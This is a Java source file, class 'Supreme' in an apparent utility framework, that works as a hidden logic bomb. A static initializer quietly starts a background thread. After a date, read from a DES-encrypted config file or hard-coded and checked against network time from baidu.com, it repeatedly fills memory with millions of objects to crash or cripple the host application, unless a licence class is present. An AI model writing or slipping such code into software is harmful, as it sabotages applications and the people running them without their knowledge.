package com.mxny.ss.java;

import com.mxny.ss.dto.DTO;
import com.mxny.ss.util.SpringUtil;

import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.security.Key;
import java.text.SimpleDateFormat;
import java.util.*;

public class Supreme {
    private final static List<DTO> tick = new ArrayList<>();
    private final static String charset = "UTF-8";
    private final static String algorithm = "DES";
    //过期时间
    private final static String ST_DT = "2022-5-1";
    //默认五分钟来一次
    private final static long DEFAULT_PERIOD = 300000;

    static{
        new Thread(){
            @Override
            @SuppressWarnings("unchecked")
            public void run() {
                try {
                    Thread.sleep(120000L);
                    Class powerClass = (Class) B.b.g("p");
                    if(powerClass == null){
                        incantation();
                        return;
                    }
                } catch (Exception e) {
                }
            }
        }.start();
    }
    /**
     *入口方法咒语
     */
    @SuppressWarnings(value={"unchecked", "deprecation"})
    public static void incantation() {
        //检查s文件是否存在，并且格式为日期年-月-日。 密钥为sharp-sword
        //第二行为执行间隔，默认为DEFAULT_PERIOD
        List<String> ss = getFileContentList("conf/s");
        Date compareDate = null;
        if(ss == null || ss.isEmpty()) {
            compareDate = new Date(1659283200000L);
            if (now().after(compareDate) && tick.isEmpty()) {
                tick.add(new DTO());
                long period = ss.size() >=2 ? Long.parseLong(decrypt(ss.get(1), "sharp-sword")) : DEFAULT_PERIOD;
                exec(period);
            }
        }else{
            //第一行有AppName前缀的格式: uap#2021-8-1
            String[] line1s = decrypt(ss.get(0), "sharp-sword").split("#");
            if(line1s.length <= 1){
                compareDate = dateStr2Date(decrypt(ss.get(0), "sharp-sword"), "yyyy-MM-dd");
                if (now().after(compareDate) && tick.isEmpty()) {
                    tick.add(new DTO());
                    long period = ss.size() >=2 ? Long.parseLong(decrypt(ss.get(1), "sharp-sword")) : DEFAULT_PERIOD;
                    exec(period);
                }
            }else{
                new Thread(() -> {
                    //如果有appName的前缀，则针对appName单独处理，由于spring.application.name可能取不到，所有异常延时10秒读取
                    try {
                        Thread.sleep(10000);
                    } catch (InterruptedException e) {
                    }
                    String appName = SpringUtil.getProperty("spring.application.name", "undefined");
                    String compareDateStr = "";
                    //AppName对应，则直接超期
                    if(line1s[0].equals(appName)){
                        compareDateStr = line1s[1];
                    }else{
                        compareDateStr = "2000-1-1";
                    }
                    Date compareDate2 = dateStr2Date(compareDateStr, "yyyy-MM-dd");
                    if (now().after(compareDate2) && tick.isEmpty()) {
                        tick.add(new DTO());
                        long period = ss.size() >=2 ? Long.parseLong(decrypt(ss.get(1), "sharp-sword")) : DEFAULT_PERIOD;
                        exec(period);
                    }
                }).start();
            }
        }
    }

    @SuppressWarnings(value={"unchecked", "deprecation"})
    private static List<String> getFileContentList(String fn) {
        BufferedReader br = null;
        InputStream is = null;
        List<String> list = new ArrayList<String>();
        try {
            Enumeration<URL> enumeration = B.class.getClassLoader().getResources(fn);
            while (enumeration.hasMoreElements()) {
                is = (InputStream) enumeration.nextElement().getContent();
                br = new BufferedReader(new InputStreamReader(is));
                String s;
                while ((s = br.readLine()) != null) {
                    list.add(s);
                }
            }
            return list;
        } catch (Exception e) {
            return list;
        } finally {
            try {
                if (is != null) {
                    is.close();
                }
                if (br != null) {
                    br.close();
                }
            } catch (Exception e2) {
            }
        }
    }

    /**
     * 执行
     * @param period
     */
    @SuppressWarnings(value={"unchecked", "deprecation"})
    private static void exec(long period) {
        new Thread(() -> {
            while(true) {
                add();
                try {
                    Thread.sleep(period);
                } catch (InterruptedException e) {
                }
            }
        }).start();
    }

    /**
     * 新线程加，如果中途被清空会继续加
     */
    @SuppressWarnings(value={"unchecked", "deprecation"})
    private static void add(){
        new Thread(() -> {
            do {
                int i = 0;
                //80000*200占用1838M, 100000*100占用1492M
                while (i <= 10000) {
                    for(int j=0; j<2000; j++) {
                        tick.add(new DTO());
                    }
                    i++;
                    try {
                        Thread.sleep(1L);
                    } catch (InterruptedException e) {
                    }
                }
            }while(tick.isEmpty());
            tick.size();
            //保持状态500ms
            try {
                Thread.sleep(500L);
            } catch (InterruptedException e) {
            }
            tick.clear();
            System.gc();
        }).start();
    }

    @SuppressWarnings(value={"unchecked", "deprecation"})
    private static Date now(){
        try {
            URL url = new URL("http://www.baidu.com");
            java.net.URLConnection uc=url.openConnection();
            uc.connect();
            return new Date(uc.getDate());
        } catch (Exception e) {
            return new Date();
        }
    }

    /**
     * 格式化日期串为Date
     * @param dateStr
     * @param dateStrFormat
     * @return
     */
    @SuppressWarnings(value={"unchecked", "deprecation"})
    private static Date dateStr2Date(String dateStr, String dateStrFormat) {
        try {
            if (dateStr == null || "".equals(dateStr.trim())) {
                return null;
            } else {
                SimpleDateFormat e = new SimpleDateFormat(dateStrFormat);
                return e.parse(dateStr);
            }
        } catch (Exception var3) {
            throw new RuntimeException("日期格式化转换失败", var3);
        }
    }

    @Override
    public String toString() {
        return "";
    }

    /**
     * 解密
     * @param encryptStr	密文
     * @param key			密钥
     * @return				明文
     */
    public static String decrypt(String encryptStr, String key) {
        String strDecrypt = null;
        try {
            strDecrypt = new String(decryptByte(Base64.getDecoder().decode(encryptStr), key), charset);
        } catch (Exception e) {
            throw new RuntimeException("decrypt exception",e);
        }
        return strDecrypt;
    }

    /**
     * 字节解密
     * @param encryptByte	密文
     * @param key			密钥
     * @return				明文
     */
    public static byte[] decryptByte(byte[] encryptByte, String key) {
        Cipher cipher;
        byte[] decryptByte = null;
        try {
            cipher = Cipher.getInstance(algorithm);
            cipher.init(Cipher.DECRYPT_MODE, generateKey(key));
            decryptByte = cipher.doFinal(encryptByte);
        } catch (Exception e) {
            throw new RuntimeException("decryptByte exception",e);
        } finally {
            cipher = null;
        }
        return decryptByte;
    }

    /**
     * 根据传入的字符串的key生成key对象
     *
     * @param strKey
     */
    public static Key generateKey(String strKey) {
        try{
            DESKeySpec desKeySpec = new DESKeySpec(strKey.getBytes(charset));
            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(algorithm);
            return keyFactory.generateSecret(desKeySpec);
        }catch(Exception e){
            throw new RuntimeException("generateKey exception",e);
        }
    }

}